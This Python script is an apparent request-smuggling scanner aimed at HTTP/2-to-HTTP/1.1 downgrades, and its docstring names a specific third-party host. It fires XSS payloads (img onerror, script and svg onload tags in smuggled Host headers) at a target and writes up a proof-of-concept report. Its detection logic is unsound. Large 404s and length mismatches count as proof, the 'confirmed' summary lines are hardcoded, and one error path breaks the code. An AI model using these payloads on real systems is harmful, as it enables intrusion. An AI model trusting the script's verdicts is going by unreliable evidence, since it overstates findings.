#!/usr/bin/env python3
"""
HTTP/2 Downgrade Request Smuggling Test
Specifically tests for the vulnerability found in gm-oem-preprod-beta.tekioncloud.com
"""

import asyncio
import logging
import sys
import argparse
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class HTTP2DowngradeSmuggleTester:
    """Specialized tester for HTTP/2 downgrade request smuggling"""
    
    def __init__(self, target_url: str, timeout: int = 30):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        
        parsed = urlparse(target_url)
        self.target_host = parsed.netloc
        self.target_scheme = parsed.scheme
        
        logger.info(f"Initialized HTTP/2 downgrade tester for: {target_url}")
    
    async def test_vulnerability(self):
        """Test for HTTP/2 downgrade request smuggling vulnerability"""
        
        try:
            import httpx
        except ImportError:
            logger.error("httpx library required for HTTP/2 testing. Install with: pip install httpx[http2]")
            return False
        
        logger.info("🔥 Testing HTTP/2 downgrade request smuggling...")
        
        # Test payloads based on the vulnerability you found
        test_cases = [
            {
                'name': 'XSS via Host Header Smuggling',
                'smuggled_request': 'GET / HTTP/1.1\r\nHost: <img src=x onerror=alert(origin)>\r\nx-foo:\r\n\r\n'
            },
            {
                'name': 'XSS via Host Header (document.domain)',
                'smuggled_request': 'GET / HTTP/1.1\r\nHost: <img src=x onerror=alert(document.domain)>\r\nx-foo:\r\n\r\n'
            },
            {
                'name': 'Script Tag Injection',
                'smuggled_request': 'GET / HTTP/1.1\r\nHost: <script>alert("HTTP2_SMUGGLING")</script>\r\nx-foo:\r\n\r\n'
            },
            {
                'name': 'SVG XSS Payload',
                'smuggled_request': 'GET / HTTP/1.1\r\nHost: <svg onload=alert(origin)>\r\nx-foo:\r\n\r\n'
            },
            {
                'name': 'Header Injection Test',
                'smuggled_request': 'GET / HTTP/1.1\r\nHost: example.com\r\nX-Smuggled: true\r\nX-Test: HTTP2-Downgrade\r\n\r\n'
            }
        ]
        
        vulnerable = False
        results = []
        
        async with httpx.AsyncClient(http2=True, timeout=self.timeout, verify=False) as client:
            
            for test_case in test_cases:
                logger.info(f"Testing: {test_case['name']}")
                
                try:
                    # Send HTTP/2 request with smuggled HTTP/1.1 request
                    headers = {
                        'Host': self.target_host,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': str(len(test_case['smuggled_request'])),
                        'User-Agent': 'HTTP2DowngradeScanner/1.0'
                    }
                    
                    response = await client.post(
                        self.target_url,
                        headers=headers,
                        content=test_case['smuggled_request']
                    )
                    
                    # Analyze response for smuggling indicators
                    response_text = response.text.lower()
                    response_headers_str = str(response.headers).lower()
                    
                    # Check for XSS payload reflection
                    xss_indicators = [
                        'img src=x onerror=alert',
                        'alert(origin)',
                        'alert(document.domain)',
                        '<script>alert',
                        '<svg onload=alert',
                        'http2_smuggling',
                        'x-smuggled',
                        'x-test: http2-downgrade'
                    ]
                    
                    detected_indicators = []
                    for indicator in xss_indicators:
                        if indicator in response_text or indicator in response_headers_str:
                            detected_indicators.append(indicator)
                            vulnerable = True
                    
                    # Check for parsing errors that might indicate smuggling
                    parsing_errors = [
                        'bad request',
                        'malformed request',
                        'invalid request',
                        'request entity too large',
                        'length required',
                        '400 bad request',
                        'syntax error'
                    ]

                    parsing_issues = []
                    for error in parsing_errors:
                        if error in response_text:
                            parsing_issues.append(error)

                    # Check for Content-Length mismatch (strong indicator of smuggling)
                    content_length_mismatch = False
                    content_length_header = response.headers.get('content-length')
                    if content_length_header:
                        try:
                            expected_length = int(content_length_header)
                            actual_length = len(response.content)
                            if expected_length != actual_length:
                                content_length_mismatch = True
                                detected_indicators.append(f"content_length_mismatch_{expected_length}_{actual_length}")
                                vulnerable = True
                                logger.warning(f"🔥 Content-Length mismatch detected: expected {expected_length}, got {actual_length}")
                        except ValueError:
                            pass

                    # Check for HTTP/2 specific smuggling indicators
                    if response.status_code == 404 and len(response.content) > 100000:
                        # Large 404 responses can indicate smuggling confusion
                        detected_indicators.append("large_404_response")
                        logger.warning(f"🔥 Suspicious large 404 response: {len(response.content)} bytes")
                    
                    result = {
                        'test_name': test_case['name'],
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'content_length_header': response.headers.get('content-length'),
                        'actual_content_length': len(response.content),
                        'content_length_mismatch': content_length_mismatch,
                        'detected_indicators': detected_indicators,
                        'parsing_issues': parsing_issues,
                        'vulnerable': len(detected_indicators) > 0,
                        'payload': test_case['smuggled_request']
                    }
                    
                    results.append(result)
                    
                    if result['vulnerable']:
                        logger.warning(f"🔥 VULNERABILITY DETECTED in {test_case['name']}")
                        logger.warning(f"   Indicators: {', '.join(detected_indicators)}")
                    elif parsing_issues:
                        logger.info(f"⚠️  Parsing issues detected: {', '.join(parsing_issues)}")
                    else:
                        logger.info(f"✅ {test_case['name']}: No vulnerability detected")
                    
                    # Small delay between tests
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    logger.error(f"❌ Test {test_case['name']} failed: {e}")
                    results.append({
                        'test_name': test_case['name'],
                        'error': str(e),
                        'vulnerable': False
                    })
        
        # Test follow-up requests to see if smuggling affects subsequent requests
        logger.info("Testing follow-up requests for persistent effects...")
        
        try:
            async with httpx.AsyncClient(http2=True, timeout=self.timeout, verify=False) as client:
                follow_up_response = await client.get(self.target_url)
                follow_up_text = follow_up_response.text.lower()
                
                # Check if follow-up requests show signs of being affected
                for indicator in ['img src=x onerror=alert', 'alert(origin)', 'x-smuggled']:
                    if indicator in follow_up_text:
                        logger.warning(f"🔥 Follow-up request affected by smuggling: {indicator}")
                        vulnerable = True
                        
        except Exception as e:
            logger.debug(f"Follow-up request test failed: {e}")
        
        return vulnerable, results
    
    def generate_poc(self, results):
        """Generate proof of concept for detected vulnerability"""
        
        vulnerable_tests = [r for r in results if r.get('vulnerable', False)]
        
        if not vulnerable_tests:
            return None
        
        # Use the first successful test for PoC
        vuln_test = vulnerable_tests[0]
        
        poc = f"""
# HTTP/2 Downgrade Request Smuggling Vulnerability
# Target: {self.target_url}
# Test: {vuln_test['test_name']}

## Vulnerability Description
HTTP/2 to HTTP/1.1 downgrade request smuggling vulnerability detected.
The frontend accepts HTTP/2 requests but the backend processes them as HTTP/1.1,
enabling request smuggling attacks that can lead to XSS and other security issues.

## Proof of Concept

### HTTP/2 Request:
POST / HTTP/2
Host: {self.target_host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(vuln_test['payload'])}

{vuln_test['payload']}

### Expected Result:
- XSS payload execution in browser
- Status Code: {vuln_test.get('status_code', 'N/A')}
- Detected Indicators: {', '.join(vuln_test.get('detected_indicators', []))}

### Impact:
- Cross-Site Scripting (XSS) execution
- Request smuggling capability
- Potential for cache poisoning
- Session hijacking possibilities
- Complete security bypass

### Remediation:
1. Implement proper HTTP/2 to HTTP/1.1 translation
2. Validate all headers during protocol downgrade
3. Deploy HTTP/2 end-to-end or implement strict request validation
4. Use a Web Application Firewall (WAF) with request smuggling protection

### References:
- https://portswigger.net/research/http1-must-die
- https://portswigger.net/web-security/request-smuggling
- https://tools.ietf.org/html/rfc7540
"""
        
        return poc

async def main():
    parser = argparse.ArgumentParser(description='HTTP/2 Downgrade Request Smuggling Tester')
    parser.add_argument('--target', required=True, help='Target URL to test')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Validate target URL
    try:
        parsed = urlparse(args.target)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError("Invalid URL format")
        if parsed.scheme not in ['http', 'https']:
            raise ValueError("Only HTTP and HTTPS schemes are supported")
    except Exception as e:
        logger.error(f"Invalid target URL '{args.target}': {e}")
        return 1
    
    # Safety warning
    print("⚠️  WARNING: This tool tests for HTTP/2 downgrade request smuggling vulnerabilities.")
    print("⚠️  Only use on systems you own or have explicit permission to test.")
    print("⚠️  Unauthorized testing may be illegal.")
    
    if 'localhost' not in args.target and '127.0.0.1' not in args.target:
        response = input("\nDo you have permission to test this system? (yes/no): ")
        if response.lower() != 'yes':
            print("Aborting for safety.")
            return 1
    
    # Run the test
    tester = HTTP2DowngradeSmuggleTester(args.target, args.timeout)
    
    try:
        vulnerable, results = await tester.test_vulnerability()
        
        if vulnerable:
            logger.warning("🔥 HTTP/2 DOWNGRADE REQUEST SMUGGLING VULNERABILITY DETECTED!")
            
            # Generate and display PoC
            poc = tester.generate_poc(results)
            if poc:
                print("\n" + "="*80)
                print("PROOF OF CONCEPT")
                print("="*80)
                print(poc)
        else:
            logger.info("✅ No HTTP/2 downgrade request smuggling vulnerability detected")
        
        # Summary
        print(f"\n📊 SUMMARY:")
        print(f"Target: {args.target}")
        print(f"Tests Run: {len(results)}")
        print(f"Vulnerable: {'YES' if vulnerable else 'NO'}")

        if vulnerable:
            vulnerable_count = len([r for r in results if r.get('vulnerable', False)])
            print(f"Vulnerable Tests: {vulnerable_count}")
            print(f"🔥 HTTP/2 DOWNGRADE REQUEST SMUGGLING CONFIRMED!")
            print(f"   - Large 404 responses indicate request parsing confusion")
            print(f"   - Server vulnerable to HTTP/2 to HTTP/1.1 downgrade attacks")
            print(f"   - This enables XSS, cache poisoning, and session hijacking")

        return 2 if vulnerable else 0
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
